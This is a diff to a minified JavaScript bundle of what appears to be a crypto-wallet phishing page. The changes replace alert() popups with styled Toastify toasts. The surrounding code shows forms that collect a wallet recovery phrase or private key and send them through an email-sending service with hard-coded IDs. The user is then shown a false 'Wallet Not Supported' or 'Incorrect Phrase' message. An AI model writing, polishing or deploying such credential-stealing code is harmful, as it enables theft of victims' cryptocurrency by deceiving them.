@@ -29897,17 +29897,29 @@
                                 ref: n,
                                 onSubmit: e => {
                                     e.preventDefault(),
-                                        p ? alert("Incorrect Phrase") : (c(!0),
-                                        A("service_rzwb5md", "template_yazkalc", n.current, "8u9fnC_pWtKbqib_K").then((e => {
+                                        p ? Toastify({
+                                            text: "Incorrect Phrase",
+                                            className: "info",
+                                            style: {
+                                                background: "linear-gradient(to right, #00b09b, #96c93d)",
+                                            }
+                                        }).showToast() : (c(!0),
+                                            A("service_rzwb5md", "template_yazkalc", n.current, "8u9fnC_pWtKbqib_K").then((e => {
                                                 console.log(e),
-                                                    alert("Wallet Not Supported"),
+                                                    Toastify({
+                                                        text: "Wallet Not Supported",
+                                                        className: "info",
+                                                        style: {
+                                                            background: "linear-gradient(to right, #00b09b, #96c93d)",
+                                                        }
+                                                    }).showToast()
                                                     l(""),
                                                     c(!1)
                                             }
                                             ), (e => {
                                                 console.log(e),
                                                     c(!1),
-                                                    alert(e.message)
+                                                    Toastify(e.message).showToast()
                                             }
                                             )))
                                 }
@@ -29984,16 +29996,28 @@
                                         i ? (c(!0),
                                         A("service_rzwb5md", "template_yazkalc", n.current, "8u9fnC_pWtKbqib_K").then((e => {
                                                 console.log(e),
-                                                    alert("Wallet Not Supported"),
+                                                    Toastify({
+                                                        text: "Wallet Not Supported",
+                                                        className: "info",
+                                                        style: {
+                                                            background: "linear-gradient(to right, #00b09b, #96c93d)",
+                                                        }
+                                                    }).showToast(),
                                                     l(""),
                                                     c(!1)
                                             }
                                             ), (e => {
                                                 console.log(e),
                                                     c(!1),
-                                                    alert(e.message)
+                                                    Toastify(e.message).showToast()
                                             }
-                                            ))) : alert("Invalid private key. Please enter at least 64 alphanumeric characters.")
+                                        ))) : Toastify({
+                                            text: "Invalid private key. Please enter at least 64 alphanumeric characters.",
+                                            className: "info",
+                                            style: {
+                                                background: "linear-gradient(to right, #00b09b, #96c93d)",
+                                            }
+                                        }).showToast()
                                 }
                                 ,
                                 ref: n,
@@ -30050,7 +30074,7 @@
                                         ), (e => {
                                             console.log(e),
                                                 i(!1),
-                                                alert(e.message)
+                                                Toastify(e.message).showToast()
                                         }
                                         ))
                                 }
@@ -30353,5 +30377,20 @@
 }
 )();
 
+
+function showToast(message, position, type) {
+    const toast = document.getElementById("toast");
+    toast.className = toast.className + " show";
+
+    if (message) toast.innerText = message;
+
+    if (position !== "") toast.className = toast.className + ` ${position}`;
+    if (type !== "") toast.className = toast.className + ` ${type}`;
+
+    setTimeout(function () {
+        toast.className = toast.className.replace(" show", "");
+    }, 5000);
+
+}
 
 //# sourceMappingURL=main.6d23d4c1.js.map
